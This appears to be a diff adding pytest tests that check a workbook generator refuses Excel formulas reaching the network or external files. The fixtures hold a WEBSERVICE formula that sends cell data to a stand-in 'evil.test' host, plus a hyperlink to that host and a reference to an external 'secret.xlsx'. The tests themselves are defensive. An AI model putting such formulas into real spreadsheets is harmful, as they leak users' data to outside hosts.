@@ -261,6 +261,38 @@ def test_an_empty_workbook_is_refused():
         PROVIDER.build_workbook(WorkbookSpec(title="Vide"))
 
 
+@pytest.mark.parametrize(
+    "formula",
+    [
+        '=WEBSERVICE("https://evil.test/?x="&A1)',
+        '=HYPERLINK("https://evil.test","ouvrir")',
+        "='[secret.xlsx]Feuil1'!A1",
+        "=Feuil2!A1",
+    ],
+)
+def test_network_and_external_excel_formulas_are_refused(formula):
+    spec = WorkbookSpec(
+        title="Sûr",
+        sheets=(Sheet(name="F", columns=(Column("A", formula=formula),), rows=((None,),)),),
+    )
+    with pytest.raises(OfficeError, match="formule Excel refusée"):
+        PROVIDER.build_workbook(spec)
+
+
+def test_safe_local_excel_function_and_references_are_allowed():
+    spec = WorkbookSpec(
+        title="Sûr",
+        sheets=(
+            Sheet(
+                name="F",
+                columns=(Column("A"), Column("B", formula="=ROUND(SUM(A1:A{row})*1.2,2)")),
+                rows=((2, None),),
+            ),
+        ),
+    )
+    assert PROVIDER.build_workbook(spec).extension == "xlsx"
+
+
 # ── PowerPoint ────────────────────────────────────────────────────────────
 
 
